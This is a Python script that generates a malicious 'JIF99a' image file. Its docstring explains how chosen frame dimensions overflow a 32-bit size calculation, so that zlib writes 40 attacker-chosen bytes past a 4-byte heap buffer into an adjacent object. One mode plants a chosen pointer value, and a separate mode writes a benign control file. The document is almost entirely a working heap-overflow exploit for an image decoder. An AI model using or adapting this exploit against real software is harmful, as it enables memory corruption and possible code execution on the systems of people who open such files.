#!/usr/bin/env python3
"""Write a JIF99a file whose 16-bit frame dimensions are reachable on disk.

len=33025, height=65026 -> len*height = 0x80000002; with the graphics
control extension's transparent index, alpha doubling wraps data_size to 4
while the pinned zs.avail_out stays 0x80000002 (2147483650). The zlib stream
inflates to 40 chosen bytes, enough to pass the 4-byte `indexes` allocation
and reach an adjacent live object.

Usage: make-jif.py OUT (bytes HEXBYTE | ptr)
"""
import struct
import sys
import zlib

LEN, HEIGHT = 33025, 65026
assert LEN * HEIGHT == 0x80000002
assert (LEN * HEIGHT * 2) & 0xFFFFFFFF == 4

out, kind = sys.argv[1], sys.argv[2]
if kind == "safe":
    LEN, HEIGHT = 4, 4
    plain = bytes([int(sys.argv[3], 16)]) * 16
elif kind == "bytes":
    plain = bytes([int(sys.argv[3], 16)]) * 40
elif kind == "ptr":
    chosen = struct.pack("<Q", 0x00007F0000414243)
    plain = b"\x4d" * 32 + chosen + b"\x4d" * 8
else:
    raise SystemExit("unknown mode")
gce = b"" if kind == "safe" else b"\x21\xf9\x04\x01\x00\x00\x00\x00"
z = zlib.compress(plain, 9)
chunks = b"".join(bytes([len(z[i:i + 255])]) + z[i:i + 255]
                  for i in range(0, len(z), 255)) + b"\x00"
jif = (b"JIF99a"
       + struct.pack("<HHBBB", LEN, HEIGHT, 0x00, 0x00, 0x00)
       + gce                                       # GCE: transparent index 0
       + b"\x2c" + struct.pack("<HHHHB", 0, 0, LEN, HEIGHT, 0x00)
       + b"\x08"                                   # code size -> bpp=8
       + chunks + b"\x3b")
with open(out, "wb") as fd:
    fd.write(jif)
print(f"WROTE {out} len={LEN} height={HEIGHT} product=0x{LEN * HEIGHT:08x} "
      f"data_size={(LEN * HEIGHT * 2) & 0xFFFFFFFF} "
      f"avail_out={LEN * HEIGHT} plain={len(plain)} zlen={len(z)} "
      f"file={len(jif)}")
